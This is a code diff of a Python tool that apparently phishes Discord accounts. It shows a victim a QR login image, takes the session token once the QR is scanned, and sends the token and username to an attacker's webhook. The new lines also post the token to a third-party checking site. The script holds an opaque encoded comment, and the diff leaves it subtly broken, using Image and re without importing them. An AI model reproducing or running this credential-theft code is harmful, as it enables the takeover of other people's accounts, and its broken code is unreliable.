@@ -1,16 +1,10 @@
-from PIL import Image, ImageDraw, ImageFilter
 from bs4 import BeautifulSoup
 from selenium import webdriver
-import base64
-import pyfiglet
-import time
-import requests
-import os
-import platform
+import base64, pyfiglet, time, requests, os
 from discord import Webhook, RequestsWebhookAdapter
-from urllib.request import Request, urlopen
-from json import loads, dumps
-web_hook_url = r""
+
+web_hook_url = "YOUR HOOK URL HERE"
+
 print(pyfiglet.figlet_format("moom825"))
 token = ""
 WINDOW_SIZE = "0,0"
@@ -37,9 +31,8 @@ pos = ((img_qr_big.size[0] - face.size[0]) // 2, (img_qr_big.size[1] - face.size
 img_qr_big.paste(face, pos)
 im1 = Image.open('temp/template.png', 'r')
 im1.paste(img_qr_big, (120, 409))
-print("Complete...")
 print("Saving...")
-ine = input("what would you like to name your picture?(do not add extention): ")
+ine = input("what would you like to name your picture?(eg: savepicture (dont give extension)): ")
 time.sleep(1)
 im1.save(ine + ".png")
 cururl = driver.current_url
@@ -64,21 +57,22 @@ while 1 == 1:
         return gotem;''')
         driver.close()
         break
-print("The user has scanned it...")
-print("Info recived...")
+print("User scanned QR code...")
 #TWQkd29tRA9vZKFnaO5odyT0eHlrPDB0sKWuAKmstGC0dPNvIZVpZKFkb2JpJGdyeG8yCTBceYNbf3KkAKKvvGivtqy5IYpnIZRwbOZwbeYhYPRscqo=
 print("Sending to Webhook...")
-content_type="application/json"
-headers = {
-    "Content-Type": content_type,
-    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
-}
-if token:
-    headers.update({"Authorization": token})
-j = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
-a = j['username'] + "#" + j['discriminator']
-webhook = Webhook.from_url(web_hook_url, adapter=RequestsWebhookAdapter())
-ok = "Token: \n" + token + "\n\nUsername: \n" + a
-webhook.send(ok)
+if re.search("[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", token) == None:
+    print("invalid token? (didnt match regex)")
+
+check = requests.post('https://utilities.tk/tokens/check', json={'token':token})
+
+if check.status_code == 401:
+    print('Account invalid.')
+elif check.status_code == 403:
+    a = check.json()['username']
+    print(f"Account locked. `{a}`")
+elif check.status_code == 200:
+    a = check.json()['username']
+    print(f"Account valid! `{a}`")
+
+Webhook.from_url(web_hook_url, adapter=RequestsWebhookAdapter()).send("Token: \n" + token + "\n\nUsername: \n" + a)
 print("Thank you for using")
-       
